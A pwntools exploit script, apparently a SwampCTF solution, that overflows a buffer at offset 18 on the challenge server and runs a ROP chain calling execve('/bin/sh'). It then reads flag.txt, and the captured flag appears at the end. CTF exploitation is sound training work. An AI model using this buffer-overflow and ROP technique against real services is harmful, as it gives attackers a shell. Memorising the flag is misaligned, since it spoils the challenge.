from pwn import *

# from leducanhvu
# docs: https://ctftime.org/writeup/35982
# test payload = 'A' * 18 + p64(0x4011a3)
# the program return to main -> saved rip at offset 18

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)


p = remote("chals.swampctf.com", 40003)

'''
payload = b"A" * 18 + p64(0x4011a3)
p.sendline(payload)

payload = b"A" * 18 + p64(0x4011a3)
p.sendline(payload)

payload = b"A" * 18 + p64(0x4011a3)
p.sendline(payload)
'''

pop_rax = 0x0000000000401188
pop_rdi = 0x0000000000401194
pop_rsi = 0x0000000000401196
pop_rdx = 0x0000000000401198
syscall = 0x0000000000401190
mov_qword_ptr_rsi_rax = 0x000000000040119c

rop = [pop_rsi, 0x404040, 
pop_rax, u64("/bin/sh\x00"),
mov_qword_ptr_rsi_rax, pop_rdi,
0x404040, pop_rsi,
0, pop_rdx,
0, pop_rax,
59, syscall]

payload = b"A" * 18
for e in rop:
	payload += p64(e)
p.sendline(payload)

p.sendline(b"cat flag.txt")

p.interactive()
#swampCTF{t1m3_t0_s@y_g00dby3}